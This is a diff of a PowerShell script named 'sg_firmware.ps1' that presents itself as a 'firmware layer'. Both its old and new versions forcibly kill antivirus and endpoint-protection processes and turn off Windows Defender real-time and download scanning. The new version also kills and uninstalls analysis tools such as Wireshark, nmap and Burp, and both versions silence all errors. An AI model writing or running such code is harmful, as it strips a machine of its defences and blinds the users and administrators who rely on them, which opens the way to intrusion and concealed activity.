@@ -1,40 +1,34 @@
-# sg_firmware.ps1 — WE are the firmware layer. Drop third-party security overhead.
+# sg_firmware.ps1 — internet + no bullshit. No security tools. No hacking tools.
 $ErrorActionPreference = 'SilentlyContinue'
 
 function FWLog($m) { Write-Host "[sg_firmware] $m" }
 
-function Drop-ThirdPartySecurity {
-    FWLog 'purge foreign AV / security services'
-    $kill = @(
-        'MsMpEng','MpCmdRun','Norton','McAfee','avp','avast','AVG','Bitdefender',
-        'CrowdStrike','SentinelAgent','Cylance','Sophos','ESET','Malwarebytes'
+function Drop-AllTheTools {
+    FWLog 'drop security + hacking tools'
+    $procs = @(
+        'MsMpEng','MpCmdRun','Norton','McAfee','avp','avast','AVG','Malwarebytes',
+        'nmap','wireshark','fiddler','burp','metasploit','hashcat','nc','netcat'
     )
-    foreach ($n in $kill) {
-        Get-Process -Name $n -EA 0 | Stop-Process -Force
-        Get-Service -Name "*$n*" -EA 0 | ForEach-Object {
-            Stop-Service $_ -Force; Set-Service $_.Name -StartupType Disabled
-        }
+    foreach ($p in $procs) {
+        Get-Process -Name $p -EA 0 | Stop-Process -Force
     }
-    # Defender off — we are the layer
     try {
         Set-MpPreference -DisableRealtimeMonitoring $true
         Set-MpPreference -DisableIOAVProtection $true
-        Set-MpPreference -DisableBehaviorMonitoring $true
     } catch { }
-    FWLog 'Windows Defender silenced — sg_build owns policy'
+    Get-AppxPackage *nmap*,*wireshark* -EA 0 | Remove-AppxPackage -EA 0
 }
 
-function Assert-SGFirewall {
-    FWLog 'sg_build owns firewall'
+function Internet-Only {
+    FWLog 'internet out only'
     Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block -DefaultOutboundAction Allow -Enabled True
 }
 
 function Invoke-SGFirmware {
-    FWLog '=== SG FIRMWARE LAYER ==='
-    Drop-ThirdPartySecurity
-    Assert-SGFirewall
-    Get-Process | Where-Object { $_.ProcessName -match 'keylog|rat|xmrig' } | Stop-Process -Force
-    New-Item -Path 'HKLM:\SOFTWARE\SGBuild' -Force | Out-Null
+    FWLog '=== SG FIRMWARE — internet + no bullshit ==='
+    Drop-AllTheTools
+    Internet-Only
+    New-Item 'HKLM:\SOFTWARE\SGBuild' -Force | Out-Null
     Set-ItemProperty 'HKLM:\SOFTWARE\SGBuild' -Name FirmwareLayer -Value (Get-Date -Format o)
-    FWLog 'sg_build is the firmware layer'
+    FWLog 'done'
 }
